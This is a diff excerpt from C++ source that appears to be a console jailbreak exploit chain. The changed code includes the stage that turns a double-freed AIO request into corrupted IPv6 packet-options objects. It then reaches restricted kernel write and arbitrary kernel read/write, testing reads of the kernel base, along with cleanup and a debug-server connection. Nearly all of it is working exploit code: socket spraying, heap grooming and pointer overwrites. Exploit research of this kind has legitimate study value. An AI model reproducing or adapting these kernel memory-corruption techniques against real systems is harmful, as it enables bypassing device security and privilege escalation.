+    s4.pktopts_p = locate_pktopts(pktopts_sds[0], proc_ofiles);
     printf_debug("pktopts_p: 0x%08x%08x\n",
-        (uint32_t)(pktopts_p >> 32), (uint32_t)pktopts_p);
-    if (pktopts_p != stage2_data.reqs1)
+        (uint32_t)(s4.pktopts_p >> 32), (uint32_t)s4.pktopts_p);
+    if (s4.pktopts_p != s2.reqs1)
     {
         printf_debug("pktopts_p doesn't match reqs1!\n");
-        return -1;
+        return (err = -1);
     }
+
     ptr64_t r_pktopts_p = locate_pktopts(reclaim_sd, proc_ofiles);
     printf_debug("r_pktopts_p: 0x%08x%08x\n",
         (uint32_t)(r_pktopts_p >> 32), (uint32_t)r_pktopts_p);
-    ptr64_t d_pktopts_p = locate_pktopts(dirty_sd, proc_ofiles);
+
+    s4.d_pktopts_p = locate_pktopts(dirty_sd, proc_ofiles);
     printf_debug("d_pktopts_p: 0x%08x%08x\n",
-        (uint32_t)(d_pktopts_p >> 32), (uint32_t)d_pktopts_p);
+        (uint32_t)(s4.d_pktopts_p >> 32), (uint32_t)s4.d_pktopts_p);
 
     // Getting restricted read/write with pktopts pair
     uint8_t pktinfo[0x14] = {0};
     // pktopts_p.ip6po_pktinfo = &d_pktopts_p.ip6po_pktinfo
-    *(uint64_t*)pktinfo = d_pktopts_p + 0x10;
+    *(uint64_t*)pktinfo = s4.d_pktopts_p + IPV6_PKTINFO_OFFSET;
     
     // After this, calling setsockopt/IPV6_PKTINFO for pktopts_p would set
     // the pointer of d_pktopts_p's pktopts object to any address we want,
@@ -1256,6 +1277,7 @@ int32_t make_kernel_arw()
     );
 
     // Test write
+    {
     uint8_t write_buf[0x14] = {0};
 
     *(uint64_t*)pktinfo = PVAR_TO_NATIVE(write_buf);
@@ -1275,45 +1297,57 @@ int32_t make_kernel_arw()
     if (*(uint64_t*)(write_buf) != *(uint64_t*)(pktinfo))
     {
         printf_debug("Test write failed!\n");
-        return -1;
+        return (err = -1);
+    }
     }
 
     printf_debug("* Achieved restricted write!\n");
 
-    Kernel_Memory kernel_memory = Kernel_Memory(pktopts_sds[0], dirty_sd, pipe_fds, pipe_p);
+    Kernel_Memory kmemory = Kernel_Memory(
+        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p
+    );
     printf_debug("* Kernel_Memory initialized!\n");
+    
+    // Test read with Kernel_Memory
+    {
+    uint8_t buf[16] = {0};
 
-    uint8_t kbuf[0x500] = {0};
+    kmemory.copyout(s2.kernel_base, buf, sizeof(buf));
+    printf_debug("Test read from kernel base:\n");
+    hexdump(buf, sizeof(buf));
 
-    // Test read/write
-    kernel_memory.copyout(kernel_base, kbuf, sizeof(kbuf));
-    printf_debug("Test read from kernel base\n");
-    hexdump(kbuf, 0x500);
+    kmemory.copyout(s2.evf_cv_str_p, buf, sizeof(buf));
+    printf_debug("Test read evf string:\n");
+    hexdump(buf, sizeof(buf));
+
+    if (!buf_match(buf, "evf cv", 6))
+    {
+        printf_debug("Test read failed!\n");
+        return (err = -1);
+    }
+    }
 
     printf_debug("* Achieved arbitrary kernel read/write!\n");
-    return 0;
+
+    return err;
 }
 
 void cleanup()
 {
     // Close unix socketpair
-    PS::close(setup_data.unixpair.unblock_fd);
-    PS::close(setup_data.unixpair.block_fd);
+    PS::close(s0.unixpair.unblock_fd);
+    PS::close(s0.unixpair.block_fd);
 
-    // Free worker AIOs
-    free_aios(&setup_data.worker_id, 1);
-
-    // Free test AIO
-    if (setup_data.test_id != 0)
-        free_aios(&setup_data.test_id, 1);
+    // Free blocking AIOs
+    free_aios(&s0.block_id, 1);
 
     // Close all sprayed sockets
     for (uint32_t i = 0; i < NUM_SDS; i++)
-        if (setup_data.sds[i] >= 0)
-            PS::close(setup_data.sds[i]);
+        if (s0.sds[i] >= 0)
+            PS::close(s0.sds[i]);
     
     // Free groomed AIOs
-    free_aios2(setup_data.groom_ids, NUM_GROOM_IDS);
+    free_aios2(s0.groom_ids, NUM_GROOM_IDS);
 
     // Close sd_listen
     if (sd_listen > 0) PS::close(sd_listen);
@@ -1341,7 +1375,7 @@ void main()
     PS::Breakout::init();
 
     // Attempt to connect to debug server
-    PS::Debug.connect(IP(192, 168, 1, 35), 9023);
+    PS::Debug.connect(IP(192, 168, 1, 39), 9023);
 
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
@@ -1353,7 +1387,6 @@ void main()
     printf_debug("payload_start: %p, payload_end: %p, size: %d\n",
         payload_start, payload_end, payload_end - payload_start);
 
-    // TODO: Fix this mess !!!
     // STAGE 0: Setup
     if (setup() != 0) goto end;
 
@@ -1367,7 +1400,7 @@ void main()
     if (double_free_reqs1() != 0) goto end;
 
     // STAGE 4: Get arbitrary kernel read/write
-    if ((err = make_kernel_arw()) != 0) goto end;
+    if (make_kernel_arw() != 0) goto end;
 
     end:
         cleanup();
